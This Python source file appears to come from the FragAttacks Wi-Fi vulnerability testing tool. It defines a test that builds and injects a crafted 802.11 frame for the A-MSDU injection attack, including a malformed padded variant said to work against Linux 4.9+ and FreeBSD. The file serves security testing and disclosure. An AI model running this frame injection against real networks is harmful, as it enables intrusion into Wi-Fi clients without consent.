# Copyright (c) 2020, Mathy Vanhoef <mathy.vanhoef@nyu.edu>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

from fraginternals import *

class AmsduInject(Test):
	"""
	Inject a frame identical to the one the station would receive when performing
	the A-MSDU attack by injecting an IP packet with a specific identification field.
	"""

	def __init__(self, ptype, malformed=False):
		super().__init__([
			Action(Action.Connected, Action.GetIp, enc=True),
			Action(Action.Connected, Action.Inject, enc=True)]
		)
		self.ptype = ptype
		self.malformed = malformed

	def prepare(self, station):
		log(STATUS, "Generating A-MSDU attack test frame", color="green")

		# Generate the header and payload
		header, request, self.check_fn = generate_request(station, self.ptype)

		# This checks if the to-DS is set (frame towards the AP) --- XXX Utility function for this?
		if header.FCfield & 1 != 0:
			src = station.mac
			dst = station.get_peermac()
		else:
			dst = station.peermac
			src = station.bss

		# Put the request inside an IP packet
		if not self.malformed:
			p = header/LLC()/SNAP()/IP(dst="192.168.1.2", src="1.2.3.4", id=34)/TCP()

		# This works against linux 4.9 and above and against FreeBSD
		else:
			p = header/LLC()/SNAP()/IP(dst="192.168.1.2", src="3.5.1.1")/TCP()/Raw(b"A" * 748)

		p = p/create_msdu_subframe(src, dst, request, last=True)
		set_amsdu(p[Dot11QoS])

		# Schedule transmission of frame
		self.actions[0].frame = p

